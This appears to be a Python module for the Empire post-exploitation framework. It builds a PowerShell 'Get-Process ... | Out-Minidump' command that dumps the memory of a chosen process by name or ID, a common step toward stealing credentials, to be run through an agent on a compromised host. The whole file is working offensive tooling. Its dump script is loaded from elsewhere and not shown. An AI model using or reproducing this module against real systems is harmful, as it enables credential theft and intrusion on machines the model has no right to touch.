from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        script_end = ""
        for option, values in params.items():
            if option.lower() != "agent":
                if values and values != "":
                    if option == "ProcessName":
                        script_end = "Get-Process " + values + " | Out-Minidump"
                    elif option == "ProcessId":
                        script_end = "Get-Process -Id " + values + " | Out-Minidump"

        for option, values in params.items():
            if values and values != "":
                if (
                    option != "Agent"
                    and option != "ProcessName"
                    and option != "ProcessId"
                ):
                    script_end += " -" + str(option) + " " + str(values)

        return script, script_end
